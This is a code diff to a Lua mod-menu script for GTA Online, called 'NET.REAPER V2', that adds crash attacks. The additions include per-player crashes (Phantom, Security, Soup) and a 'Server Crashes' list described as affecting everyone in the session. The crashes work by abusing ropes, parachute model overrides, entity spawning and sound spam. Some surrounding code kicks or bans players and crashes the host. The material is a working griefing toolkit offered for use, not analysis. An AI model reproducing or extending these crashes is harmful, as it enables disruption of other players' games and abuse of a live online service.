@@ -417,7 +417,6 @@ NET = {
                 {1, "[NET] Express"},
                 {2, "[NET] Dynamite"},
                 {3, "[STAND] Elegant"},
-                {4, "[NET] Mortar"},
             },
         },
 
@@ -760,6 +759,27 @@ NET = {
                 end
             end
         end,
+
+        CHANGE_PLAYER_MODEL = function(hash)
+            local model_hash = hash
+            STREAMING.REQUEST_MODEL(model_hash)
+            while (not STREAMING.HAS_MODEL_LOADED(model_hash)) do
+                util.yield(0)
+            end
+            PLAYER.SET_PLAYER_MODEL(model_hash)
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(model_hash)
+        end,
+
+        SPAWN_VEHICLE = function(Hash, Pos, Heading, Invincible)
+            STREAMING.REQUEST_MODEL(Hash)
+            while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
+            local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
+            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
+            if Invincible then
+                ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
+            end
+            return SpawnedVehicle
+        end,
     },
 
     COMMAND = {
@@ -837,7 +857,7 @@ NET = {
                         NET.FUNCTION.CRASH_PLAYER(players.get_host())
                         NET.FUNCTION.KICK_PLAYER(players.get_host())
         
-                        util.yield(35000) -- We wait and assume that this is enough time for the host to be gone
+                        util.yield(35000) -- We util.yield and assume that this is enough time for the host to be gone
         
                         if players.get_host() == players.user() and players.exists(player_id) then
                             menu.trigger_commands("ban"..TargetName)
@@ -852,7 +872,205 @@ NET = {
                 end
             end,
         },
+
         CRASH = {
+            SERVER = { -- NIGHT SCRIPTS NEEDS TO BE OPTIMIZED
+                AIO = function() -- Ryze
+                    local time = (util.current_time_millis() + 2000)
+                    while time > util.current_time_millis() do
+                        local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
+                        for i = 1, 10 do
+                            AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pc.x, pc.y, pc.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', 1, 10000, 0)
+                        end
+                        util.yield_once()
+                    end
+                end,
+
+                MOONSTAR = function() -- Night
+                    menu.trigger_commands("anticrashcam on")
+                    local user = players.user()
+                    local user_ped = players.user_ped()
+                    local pos = players.get_position(user)
+                    local cspped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+                    local TPpos = ENTITY.GET_ENTITY_COORDS(cspped, true)
+                    local cargobob = NET.FUNCTION.SPAWN_VEHICLE(0XFCFCB68B, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
+                    local cargobobPos = ENTITY.GET_ENTITY_COORDS(cargobob, true)
+                    local veh = NET.FUNCTION.SPAWN_VEHICLE(0X187D938D, TPpos, ENTITY.GET_ENTITY_HEADING(SelfPlayerPed), true)
+                    local vehPos = ENTITY.GET_ENTITY_COORDS(veh, true)
+                    local newRope = PHYSICS.ADD_ROPE(TPpos.x, TPpos.y, TPpos.z, 0, 0, 10, 1, 1, 0, 1, 1, false, false, false, 1.0, false, 0)
+                    PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, cargobob, veh, cargobobPos.x, cargobobPos.y, cargobobPos.z, vehPos.x, vehPos.y, vehPos.z, 2, false, false, 0, 0, "Center", "Center")
+                    util.yield(80)
+                    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), 0xFBF7D21F)
+                    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
+                    TASK.TASK_PARACHUTE_TO_TARGET(user_ped, pos.x, pos.y, pos.z)
+                    util.yield()
+                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(user_ped)
+                    util.yield(250)
+                    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(user_ped, 0xFBAB5776, 100, false)
+                    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(user)
+                    util.yield(1000)
+                    for i = 1, 5 do
+                        util.spoof_script("freemode", SYSTEM.util.yield)
+                    end
+                    ENTITY.SET_ENTITY_HEALTH(user_ped, 0)
+                    NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(pos.x,pos.y,pos.z, 0, false, false, 0)
+                    util.yield(2500)
+                    entities.delete_by_handle(cargobob)
+                    entities.delete_by_handle(veh)
+                    PHYSICS.DELETE_CHILD_ROPE(newRope)
+                    menu.trigger_commands("anticrashcam off")
+                end,
+
+                ROPE = function() -- Night
+                    local getEntityCoords = ENTITY.GET_ENTITY_COORDS
+                    local getPlayerPed = PLAYER.GET_PLAYER_PED
+                    local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
+                    local ppos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
+                    local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
+                    pos.x = pos.x+5
+                    ppos.z = ppos.z+1
+                    Utillitruck3 = entities.create_vehicle(2132890591, pos, 0)
+                    Utillitruck3_pos = ENTITY.GET_ENTITY_COORDS(Utillitruck3)
+                    kur = entities.create_ped(26, 2727244247, ppos, 0)
+                    kur_pos = ENTITY.GET_ENTITY_COORDS(kur)
+                    PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
+                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
+                    util.yield(50)
+                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
+                    WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()), 0xFBAB5776, 1000, false)
+                    TASK.TASK_PARACHUTE_TO_TARGET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),-1087,-3012,13.94)
+                    util.yield(500)
+                    for next = 1, 2 do
+                        ENTITY.SET_ENTITY_INVINCIBLE(kur, true)
+                        newRope = PHYSICS.ADD_ROPE(pos.x, pos.y, pos.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1.0, true, "Center")
+                        PHYSICS.ATTACH_ENTITIES_TO_ROPE(newRope, Utillitruck3, kur, Utillitruck3_pos.x, Utillitruck3_pos.y, Utillitruck3_pos.z, kur_pos.x, kur_pos.y, kur_pos.z, 2, 0, 0, "Center", "Center") 
+                        util.yield(100)
+                    end
+                    PHYSICS.ROPE_LOAD_TEXTURES()
+                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
+                    util.yield(1000)
+                    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
+                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
+                    local hashes = {2132890591, 2727244247, 1663218586, -891462355}
+                    local pc = getEntityCoords(getPlayerPed(players.user()))
+                    local veh = VEHICLE.CREATE_VEHICLE(hashes[i], pc.x + 5, pc.y, pc.z, 0, true, true, false)
+                    local ped = PED.CREATE_PED(26, hashes[2], pc.x, pc.y, pc.z + 1, 0, true, false)
+                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
+                    ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
+                    ENTITY.SET_ENTITY_VISIBLE(ped, false, 0)
+                    ENTITY.SET_ENTITY_VISIBLE(veh, false, 0)
+                    local rope = PHYSICS.ADD_ROPE(pc.x + 5, pc.y, pc.z, 0, 0, 0, 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true, 0)
+                    local vehc = getEntityCoords(veh); local pedc = getEntityCoords(ped)
+                    PHYSICS.ATTACH_ENTITIES_TO_ROPE(rope, veh, ped, vehc.x, vehc.y, vehc.z, pedc.x, pedc.y, pedc.z, 2, 0, 0, "Center", "Center")
+                    util.yield(1000)
+                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh); NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ped)
+                    PHYSICS.DELETE_CHILD_ROPE(rope)
+                    PHYSICS.ROPE_UNLOAD_TEXTURES()
+                end,
+
+                LAND = function() -- Night
+                    NET.FUNCTION.CHANGE_PLAYER_MODEL(0x9C9EFFD8)
+                    local land_area = {
+                        v3(1798.031,-2831.863,3.562),
+                        v3(-245.300,-656.019,33.168),
+                        v3(-2561.787,3175.436,32.820),
+                        v3(58.667,7198.895,3.372),
+                        v3(1279.582,3064.881,40.534),
+                        v3(3003.555,5777.601,300.729),
+                        v3(460.582,5572.078,781.179),
+                        v3(3615.213,5024.245,11.396),
+                        v3(3668.583,5645.834,11.537),
+                        v3(2027.388,-1588.856,251.008),
+                        v3(-1240.75,-587.97,27.25)
+                    }
+                    for i ,crashpos in pairs(land_area) do
+                        PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),0xE5022D03)
+                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped(players.user()))
+                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
+                        util.yield(30)
+                        local crash_num = 2
+                        pack_crash = util.create_thread(function()
+                            while crash_num == 2 do
+                                for set_para_packmodel = 0 ,50 do
+                                    util.yield(100)
+                                end
+                            end
+                        end, nil)
+                        pos = crashpos
+                        pos.z = pos.z + 0.22
+                        local p_pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
+                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(crashpos, pos.x, pos.y, pos.z)
+                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()),p_pos.x,p_pos.y,p_pos.z,false,true,true)
+                        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(players.user_ped(players.user()),0xFBAB5776, 1000, false)
+                        TASK.TASK_PARACHUTE_TO_TARGET(players.user_ped(players.user()),-1087,-3012,13.94)
+                        util.yield(600)
+                        TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped(players.user()))		
+                        util.yield(1000)
+                    end
+                    PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(PLAYER.PLAYER_ID())
+                    TASK.CLEAR_PED_TASKS_IMMEDIATELY(players.user_ped(players.user()))
+                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(players.user()),-1087,-3012,13.94)
+                end,
+
+                UMBRELLAV9 = function() -- Night
+                    local models = {1381105889, 720581693, 1117917059, 4237751313, 2365747570, 2186304526}
+                    for next = 1, #models do
+                        PEDP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
+                        object_hash = models[next]
+                        STREAMING.REQUEST_MODEL(object_hash)
+                        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
+                            util.yield()
+                        end
+                        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
+                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PEDP, 0,0,500, 0, 0, 1)
+                        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(PEDP, 0xFBAB5776, 1000, false)
+                        util.yield(1000)
+                        for i = 0 , 2 do
+                            PED.FORCE_PED_TO_OPEN_PARACHUTE(PEDP)
+                        end
+                        util.yield(1000)
+                        menu.trigger_commands("tpmazehelipad")
+                    end
+                end,
+
+                UMBRELLAV1 = function() -- Night
+                    local SelfPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
+                    local PreviousPlayerPos = ENTITY.GET_ENTITY_COORDS(SelfPlayerPed, true)
+                    for n = 0 , 3 do
+                        local object_hash = util.joaat("prop_logpile_06b")
+                        STREAMING.REQUEST_MODEL(object_hash)
+                        while not STREAMING.HAS_MODEL_LOADED(object_hash) do
+                            util.yield()
+                        end
+                        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash)
+                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, false, true, true)
+                        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
+                        util.yield(1000)
+                        for i = 0 , 20 do
+                            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
+                        end
+                        util.yield(1000)
+                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
+                    
+                        local object_hash2 = util.joaat("prop_beach_parasol_03")
+                        STREAMING.REQUEST_MODEL(object_hash2)
+                        while not STREAMING.HAS_MODEL_LOADED(object_hash2) do
+                            util.yield()
+                        end
+                        PLAYER.SET_PLAYER_PARACHUTE_MODEL_OVERRIDE(PLAYER.PLAYER_ID(),object_hash2)
+                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, 0,0,500, 0, 0, 1)
+                        WEAPON.GIVE_DELAYED_WEAPON_TO_PED(SelfPlayerPed, 0xFBAB5776, 1000, false)
+                        util.yield(1000)
+                        for i = 0 , 20 do
+                            PED.FORCE_PED_TO_OPEN_PARACHUTE(SelfPlayerPed)
+                        end
+                        util.yield(1000)
+                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
+                    end
+                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(SelfPlayerPed, PreviousPlayerPos.x, PreviousPlayerPos.y, PreviousPlayerPos.z, false, true, true)
+                end,
+
+            },
 
             ["2TAKE1"] = function(player_id)
                 NET.FUNCTION.CRASH_PLAYER(player_id)
@@ -900,6 +1118,129 @@ NET = {
                 end
             end,
 
+            -- Night
+            PHANTOM = function(player_id)
+                local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+                local veh = entities.get_all_vehicles_as_handles()
+                for i = 1, #veh do
+                    NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(veh[i])
+                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh[i], 0, 0, 5)
+                    TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 18, 777)
+                    TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 17, 888)
+                    TASK.TASK_VEHICLE_TEMP_ACTION(player, veh[i], 16, 999)
+                end
+                local ped_task = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(player_id))
+                ENTITY.FREEZE_ENTITY_POSITION(PLAYER.GET_PLAYER_PED(player_id), true)
+                entities.create_object(0x9cf21e0f , ped_task, true, false) 
+                local Rui_task = NET.FUNCTION.SPAWN_VEHICLE(util.joaat("Ruiner2"), ped_task, ENTITY.GET_ENTITY_HEADING(TTPed), true)
+                local ped_task2 = entities.create_ped(26 , util.joaat("ig_kaylee"), ped_task, 0)
+                for i = 0, 10 do
+                    local pedps = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(player_id))
+                    local allpeds = entities.get_all_peds_as_handles()
+                    local allvehicles = entities.get_all_vehicles_as_handles()
+                    local allobjects = entities.get_all_objects_as_handles()
+                    local ownped = players.user_ped(players.user())
+                    local models = {0x78BC1A3C, 0x000B75B9, 0x15F27762, 0x0E512E79}
+                    local vehicles = {0xD6BC7523, 0x1F3D44B5, 0x2A72BEAB, 0x174CB172, 0x78BC1A3C, 0x0E512E79}
+                    for next = 1, #models do
+                        util.request_model(models[next])
+                    end
+                    for next = 1, #vehicles do
+                        NET.FUNCTION.SPAWN_VEHICLE(vehicles[next], pedps, 0)
+                    end
+                    for i = 1, #allpeds do
+                        if allpeds[i] ~= ownped then
+                            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allpeds[i], 0, 0, 0)
+                        end
+                    end
+                    for i = 1, #allvehicles do
+                        if allvehicles[i] ~= ownvehicle then
+                            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allvehicles[i], 0, 0, 0)
+                            VEHICLE.SET_VEHICLE_ON_GROUND_PROPERLY(allvehicles[i], 0, 0, 0)
+                            VEHICLE.SET_TAXI_LIGHTS(allvehicles[i])
+                        end
+                    end
+                    for i = 1, #allobjects do
+                        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(allobjects[i], 0, 0, 0)
+                    end
+                    util.yield()
+                end
+                PED.RESURRECT_PED(players.user_ped(player_id))
+                util.yield(2000)
+                entities.delete_by_handle(Rui_task)
+                entities.delete_by_handle(ped_task2)
+            end,
+
+            SECURITY = function(player_id)
+                local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
+                local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)
+                local coords = ENTITY.GET_ENTITY_COORDS(ped)
+                local model = util.joaat("banshee")
+                local pos <const> = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(player_id))
+                local sb_ped <const> = entities.create_ped(26,util.joaat("a_c_rat"),pos,0)
+                local crash_plane <const> = NET.FUNCTION.SPAWN_VEHICLE(0x9c5e5644,pos,0)
+                local time <const> = util.current_time_millis() + 3500
+                local mypos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID())
+                local PEDS = {
+                    PED1 = entities.create_ped(26,util.joaat("cs_beverly"),TargetPlayerPos, 0),
+                    PED2 = entities.create_ped(26,util.joaat("cs_fabien"),TargetPlayerPos, 0),
+                    PED3 = entities.create_ped(26,util.joaat("cs_manuel"),TargetPlayerPos, 0),
+                    PED4 = entities.create_ped(26,util.joaat("cs_taostranslator"),TargetPlayerPos, 0),
+                    PED5 = entities.create_ped(26,util.joaat("cs_taostranslator2"),TargetPlayerPos, 0),
+                    PED6 = entities.create_ped(26,util.joaat("cs_tenniscoach"),TargetPlayerPos, 0),
+                    PED7 = entities.create_ped(26,util.joaat("cs_wade"),TargetPlayerPos, 0),
+                }
+                util.request_model(model)
+                local vehicle = entities.create_vehicle(model,coords,0)
+                pos.x = pos.x + 3
+                PED.SET_PED_INTO_VEHICLE(sb_ped,crash_plane,-1)
+                PED.SET_PED_INTO_VEHICLE(players.user_ped(players.user()),crash_plane,-1)
+                ENTITY.FREEZE_ENTITY_POSITION(crash_plane,true)
+                TASK.TASK_OPEN_VEHICLE_DOOR(players.user_ped(players.user()), crash_plane, 9999, -1, 2)
+                while time > util.current_time_millis() do
+                    TASK.TASK_LEAVE_VEHICLE(sb_ped, crash_plane, 0)
+                    util.yield(1)
+                    VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
+                    ENTITY.SET_ENTITY_COLLISION(vehicle, false, true)
+                    VEHICLE.SET_VEHICLE_GRAVITY(vehicle, 0)
+                    local max_mod = VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i)-1
+                    VEHICLE.SET_VEHICLE_MOD(vehicle, i, max_mod, false)
+                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(players.user()),mypos.x+300,mypos.y+700,mypos.z+1500)
+                    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(players.user()),true)
+                    for next = 1, #PEDS do
+                        ENTITY.SET_ENTITY_VISIBLE(PEDS[next], false, 0)
+                    end
+                    util.yield(500)
+                    for next = 1, #PEDS do
+                        WEAPON.GIVE_WEAPON_TO_PED(PEDS[next],-270015777,80,true,true)
+                    end
+                    util.yield(1500)
+                    for next = 1, 3 do
+                        FIRE.ADD_OWNED_EXPLOSION(players.user_ped(), TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, 2, 50, true, false, 0.0)
+                    end
+                    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(players.user_ped(players.user()), mypos.x, mypos.y, mypos.z)
+                    ENTITY.FREEZE_ENTITY_POSITION(players.user_ped(players.user()),false)
+                    util.yield(2500)
+                    for next = 1, #PEDS do
+                        entities.delete_by_handle(PEDS[next])
+                    end
+               end
+            end,
+
+            SOUP = function(player_id)
+                util.request_model(-1011537562)
+                util.request_model(-541762431)
+                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
+                local PED1  = entities.create_ped(28,-1011537562,pos,0)
+                local PED2  = entities.create_ped(28,-541762431,pos,0)
+                WEAPON.GIVE_WEAPON_TO_PED(PED1,-1813897027,1,true,true)
+                WEAPON.GIVE_WEAPON_TO_PED(PED2,-1813897027,1,true,true)
+                util.yield(1000)
+                TASK.TASK_THROW_PROJECTILE(PED1,pos.x,pos.y,pos.z,0,0)
+                TASK.TASK_THROW_PROJECTILE(PED2,pos.x,pos.y,pos.z,0,0)
+            end,
+
+            -- Ryze
             SUPER = function(player_id)
                 NET.COMMAND.CRASH.CHINESE(player_id)
                 NET.COMMAND.CRASH.JESUS(player_id)
@@ -1491,17 +1832,6 @@ NET = {
             end
         end,
 
-        CRASH_ALL = function() -- AIO
-            local time = (util.current_time_millis() + 2000)
-            while time > util.current_time_millis() do
-                local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id))
-                for i = 1, 10 do
-                    AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pc.x, pc.y, pc.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', 1, 10000, 0)
-                end
-                util.yield_once()
-            end
-        end,
-
         GIVE_PLAYER_RP = function(player_id, delay)
             if not delay then delay = 5 end
 
@@ -1990,6 +2320,10 @@ NET = {
         menu.action(CRASH_OPTIONS, "[STAND] Warhead Crash", {"warcrash"}, "Blocked by most menus.", function() NET.COMMAND.CRASH.WARHEAD(player_id) end)
         menu.action(CRASH_OPTIONS, "[NET] Express Crash", {"xcrash"}, "Blocked by most menus.", function() NET.COMMAND.CRASH.EXPRESS(player_id) end) -- (S3)
         menu.action(CRASH_OPTIONS, "[NET] Dynamite Crash", {"dcrash"}, "Blocked by most menus.", function() NET.COMMAND.CRASH.DYNAMITE(player_id) end) -- (S2)
+        menu.divider(CRASH_OPTIONS, "Night Crashes")
+        menu.action(CRASH_OPTIONS, "[NIGHT] Phantom Crash", {"phantomcrash"}, "Blocked by most menus.", function() NET.COMMAND.CRASH.PHANTOM(player_id) end)
+        menu.action(CRASH_OPTIONS, "[NIGHT] Security Crash", {"securitycrash"}, "Blocked by most menus.", function() NET.COMMAND.CRASH.SECURITY(player_id) end)
+        menu.action(CRASH_OPTIONS, "[NIGHT] Soup Crash", {"soupcrash"}, "Blocked by most menus.", function() NET.COMMAND.CRASH.SOUP(player_id) end)
         menu.divider(CRASH_OPTIONS, "Ryze Crashes")
         menu.action(CRASH_OPTIONS, "[NET] Super Crash", {"supercrash"}, "Blocked by most menus.", function() NET.COMMAND.CRASH.SUPER(player_id) end)
         menu.action(CRASH_OPTIONS, "Chinese Crash", {"ccrash"}, "Blocked by most menus.", function() NET.COMMAND.CRASH.CHINESE(player_id) end)
@@ -2067,6 +2401,14 @@ local Title = menu.divider(menu.my_root(), "NET.REAPER V2")
 
 -- Main Options
 local SELF_LIST = menu.list(menu.my_root(), "Self")
+menu.toggle_loop(SELF_LIST, "Vanity Particles", {}, "", function()
+    local PTFX = {"scr_sum2_hal_hunted_respawn","scr_sum2_hal_rider_weak_blue","scr_sum2_hal_rider_weak_green","scr_sum2_hal_rider_weak_orange","scr_sum2_hal_rider_weak_greyblack"}
+    local player_pos = players.get_position(players.user())
+    STREAMING.REQUEST_PTFX_ASSET("scr_sum2_hal")
+    GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
+    GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(PTFX[math.random(1, #PTFX)], player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
+    util.yield(200)
+end)
 local PROFILES_LIST = menu.list(SELF_LIST, "Profiles")
 menu.list_select(PROFILES_LIST, "Profiles", {}, "", NET.TABLE.PROFILE, 1, function(Value) NET.VARIABLE.Current_Profile = NET.TABLE.PROFILE[Value] end)
 menu.toggle(PROFILES_LIST, "Mute Notifications", {}, "", NET.COMMAND.MUTE_STAND_REACTION_NOTIFICATIONS)
@@ -2094,7 +2436,13 @@ menu.list_select(MODERATE_PLAYERS_LIST, "Kick Method", {}, "", NET.TABLE.METHOD.
 menu.action(MODERATE_PLAYERS_LIST, "Kick Players", {}, "", NET.COMMAND.KICK_PLAYERS)
 menu.divider(MODERATE_PLAYERS_LIST, "Crashes") -- Crashes
 menu.list_select(MODERATE_PLAYERS_LIST, "Crash Method", {}, "", NET.TABLE.METHOD.CRASH, 3, function(Value) NET.VARIABLE.Crash_Method = Value end)
-menu.action(MODERATE_PLAYERS_LIST, "AIO Crash All", {}, "Blocked by most menus, will go undetected for the most part.", NET.COMMAND.CRASH_ALL)
+local SERVER_CRASH_LIST = menu.list(MODERATE_PLAYERS_LIST, "Server Crashes", {}, "These crashes will affect everyone in the server regardless of current target selection.")
+menu.action(SERVER_CRASH_LIST, "[RYZE] AIO Crash", {}, "Blocked by most menus.", function() NET.COMMAND.CRASH.SERVER.AIO() end)
+menu.action(SERVER_CRASH_LIST, "[NIGHT] Moonstar Crash", {}, "Blocked by most menus.", function() NET.COMMAND.CRASH.SERVER.MOONSTAR() end)
+menu.action(SERVER_CRASH_LIST, "[NIGHT] Rope Crash", {}, "Blocked by most menus.", function() NET.COMMAND.CRASH.SERVER.ROPE() end)
+menu.action(SERVER_CRASH_LIST, "[NIGHT] Land Crash", {}, "Blocked by most menus.", function() NET.COMMAND.CRASH.SERVER.LAND() end)
+menu.action(SERVER_CRASH_LIST, "[NET] Umbrella V9 Crash", {}, "Blocked by most menus.\nReally just umbrellav8 from night.", function() NET.COMMAND.CRASH.SERVER.UMBRELLAV9() end)
+menu.action(SERVER_CRASH_LIST, "[NIGHT] Umbrella V1 Crash", {}, "Blocked by most menus.", function() NET.COMMAND.CRASH.SERVER.UMBRELLAV1() end)
 menu.action(MODERATE_PLAYERS_LIST, "Crash Players", {}, "", NET.COMMAND.CRASH_PLAYERS)
 menu.divider(MODERATE_PLAYERS_LIST, "Block Options") -- Block
 menu.toggle(MODERATE_PLAYERS_LIST, "Auto Kick Modders In Session", {"irondome"}, "Recommended to use when host.", function(Enabled) NET.VARIABLE.No_Modders_Session = Enabled end)
@@ -2111,6 +2459,7 @@ menu.action(TELEPORT_PLAYERS_LIST, "Teleport To My Waypoint", {}, "", NET.COMMAN
 menu.action(TELEPORT_PLAYERS_LIST, "Teleport To Casino", {}, "", NET.COMMAND.TELEPORT_PLAYERS_TO_CASINO)
 menu.toggle(ALL_PLAYERS_LIST, "Ghost Players", {}, "", function(Enabled) NET.COMMAND.GHOST_PLAYERS(Enabled) end)
 local SESSION_LIST = menu.list(menu.my_root(), "Session")
+CONSTRUCTOR_LIST = menu.list(SESSION_LIST, "Constructor") require "lib.net.Constructor"
 menu.toggle(SESSION_LIST, "Chat Commands", {}, "Say ;help.", function(Enabled) NET.VARIABLE.Commands_Enabled = Enabled end)
 menu.toggle(SESSION_LIST, "Session Overlay", {}, "General information about the server.", function(Enabled) NET.COMMAND.SESSION_OVERLAY(Enabled) end)
 local HOST_LIST = menu.list(SESSION_LIST, "Host Tools")
@@ -2128,7 +2477,7 @@ menu.action(UNSTUCK_LIST, "Unstuck", {}, "", function() menu.trigger_commands("u
 menu.action(UNSTUCK_LIST, "Quick Bail", {}, "", function() menu.trigger_commands("quickbail") end)
 menu.action(UNSTUCK_LIST, "Quit To SP", {}, "", function() menu.trigger_commands("quittosp") end)
 menu.action(UNSTUCK_LIST, "Force Quit To SP", {}, "", function() menu.trigger_commands("forcequittosp") end)
-menu.action(menu.my_root(), "Credits", {}, "Made by @getfev, Scripts from JinxScript, Ryze & Addict Script.", function() util.toast("Made by @getfev, Scripts from JinxScript, Ryze & Addict Script") end)
+menu.action(menu.my_root(), "Credits", {}, "Made by @getfev, Scripts from JinxScript, Ryze, Night LUA & Addict Script.", function() return end)
 
 PLAYERS_COUNT = menu.divider(PLAYERS_LIST, "")
 
